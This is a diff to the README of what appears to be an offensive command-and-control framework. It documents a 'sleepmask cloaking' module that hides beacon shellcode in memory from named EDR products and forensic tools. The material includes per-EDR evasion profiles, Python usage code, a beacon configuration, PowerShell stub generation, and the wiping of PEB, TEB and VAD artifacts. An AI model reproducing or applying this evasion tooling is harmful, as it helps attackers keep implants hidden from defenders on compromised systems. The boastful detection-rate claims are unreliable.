@@ -647,6 +647,174 @@ loader.load_in_memory(shellcode)
 
 ---
 
+#### 🔹 `sleepmask_cloaking.py` - AI-Dynamic Memory Cloaking (ELITE)
+
+**Ultimate memory evasion** with AI-guided technique selection, ROP chains, heap spoofing, and forensic artifact wiping. Designed to evade EDR memory forensics and tools like Volatility.
+
+| Feature | Description |
+|---------|-------------|
+| **AI-Dynamic Cloaking** | Detects EDR and selects optimal technique (ROP-heavy for SentinelOne, entropy+spoof for Defender) |
+| **Multi-Stage Masking** | Decrypt → execute chunk → re-mask + ROP chain (gadgets built at runtime) |
+| **Runtime Mutation** | Gadgets mutate during mask, post-mask reseed |
+| **OPSEC Layer** | Fake heap allocations + forensic artifact wipe (defeats Volatility plugins) |
+| **Detection Rate** | Memory artifacts drop ~99%, EDR forensic score approaches 0 |
+
+##### Cloak Levels
+
+| Level | Value | Techniques | Use Case |
+|-------|-------|------------|----------|
+| `NONE` | 0 | No cloaking | Testing only |
+| `BASIC` | 1 | Simple XOR mask | Low-security environments |
+| `STANDARD` | 2 | + Entropy normalization | Basic EDR |
+| `ADVANCED` | 3 | + Heap spoof | Corporate EDR |
+| `ELITE` | 4 | + ROP chains + artifact wipe | High-security (Falcon, S1) |
+| `PARANOID` | 5 | All techniques maxed | Nation-state level |
+
+##### EDR-Specific Profiles
+
+| EDR | Recommended Level | Key Techniques |
+|-----|-------------------|----------------|
+| CrowdStrike Falcon | ELITE | High gadget density (0.5), kernel callback evasion |
+| SentinelOne | ELITE | ROP-heavy (0.7 density), 0.25s mask interval |
+| MS Defender ATP | ADVANCED | Entropy targeting (6.0), heap spoof priority |
+| Carbon Black | ADVANCED | Module callbacks, stealth spoof |
+| None Detected | STANDARD | Minimal overhead |
+
+##### Usage Examples
+
+```python
+from evasion.sleepmask_cloaking import (
+    SleepmaskCloakingEngine, CloakLevel, EDRProduct,
+    create_elite_cloaker, quick_cloak, get_ai_recommendation
+)
+
+# Quick start - Elite cloaker with auto-detection
+cloaker = create_elite_cloaker()
+print(f"Detected EDR: {cloaker.detected_edr}")
+print(f"Cloak Level: {cloaker.cloak_level}")
+
+# Pre-sleep cloaking (call before entering sleep)
+memory_regions = [(0x10000, 4096), (0x20000, 8192)]  # (address, size)
+result = cloaker.pre_sleep_cloak(memory_regions)
+print(f"Cloaked {result['cloaked_regions']} regions, {result['heap_decoys']} decoys")
+
+# ... sleep ...
+
+# Post-sleep uncloaking
+uncloak_result = cloaker.post_sleep_uncloak()
+
+# Get AI recommendation for current environment
+recommendation = get_ai_recommendation()
+print(recommendation)
+# Output: "Detected: CrowdStrike Falcon
+#          Recommended Level: ELITE
+#          ROP Density: 50%
+#          Heap Spoof: Required
+#          Priority Artifacts: [PEB, TEB, VAD]"
+
+# Manual configuration
+engine = SleepmaskCloakingEngine(
+    cloak_level=CloakLevel.PARANOID,
+    enable_heap_spoof=True,
+    enable_artifact_wipe=True,
+    enable_rop=True,
+    remask_interval=30.0  # Re-mask every 30s during long sleeps
+)
+
+# Quick one-liner cloak
+result = quick_cloak([(0x1000, 128)])
+```
+
+##### Integration with Evasive Beacon
+
+The `evasive_beacon.py` automatically integrates sleepmask cloaking when configured:
+
+```yaml
+# beacon_config.yaml - Sleepmask Cloaking Section
+sleepmask_cloaking:
+  enabled: true
+  cloak_level: elite  # none, basic, standard, advanced, elite, paranoid
+  
+  multi_stage:
+    decrypt_chunk_size: 4096
+    remask_after_execute: true
+    
+  rop_chain:
+    enabled: true
+    gadget_sources:
+      - ntdll.dll
+      - kernel32.dll
+      - kernelbase.dll
+    mutation_interval: 10  # Mutate every 10 iterations
+    
+  entropy:
+    target_entropy: 5.5
+    normalization: true
+    
+  memory_mask:
+    xor_key_rotation: true
+    region_permutation: true
+    
+  opsec:
+    heap_spoof: true
+    heap_decoy_count: 10
+    artifact_wipe: true
+    artifact_targets:
+      - peb
+      - teb
+      - vad
+      - heap_metadata
+      
+  remask:
+    enabled: true
+    interval: 30
+    jitter: 5
+```
+
+##### PowerShell Stub Generation
+
+Generate a PowerShell cloaking module for script-based beacons:
+
+```python
+from evasion.sleepmask_cloaking import generate_ps_cloaking_stub, CloakLevel
+
+ps_code = generate_ps_cloaking_stub(
+    cloak_level=CloakLevel.ELITE,
+    include_heap_spoof=True,
+    include_rop=True
+)
+
+# Save and use in PowerShell beacon
+with open('cloak_module.ps1', 'w') as f:
+    f.write(ps_code)
+```
+
+##### Component Classes
+
+| Class | Purpose |
+|-------|---------|
+| `SleepmaskCloakingEngine` | Main orchestrator - coordinates all cloaking operations |
+| `MemoryCloakEngine` | XOR masking with key rotation and entropy normalization |
+| `ROPGadgetEngine` | Runtime gadget discovery, chain building, mutation |
+| `HeapSpoofEngine` | Fake heap allocations (PE headers, JSON, XML decoys) |
+| `ForensicArtifactWiper` | PEB/TEB/VAD/heap metadata cleanup |
+| `AICloakSelector` | EDR detection and AI-guided technique selection |
+| `QuantumEntropyGenerator` | High-quality unpredictable entropy |
+
+##### Testing
+
+```bash
+# Run sleepmask cloaking tests
+pytest tests/test_sleepmask_cloaking.py -v
+
+# Test specific components
+pytest tests/test_sleepmask_cloaking.py::TestROPGadgetEngine -v
+pytest tests/test_sleepmask_cloaking.py::TestHeapSpoofEngine -v
+pytest tests/test_sleepmask_cloaking.py::TestAICloakSelector -v
+```
+
+---
+
 ### 🎯 Evasive Beacon Usage
 
 The `evasive_beacon.py` agent integrates all evasion modules into a full-featured C2 beacon.
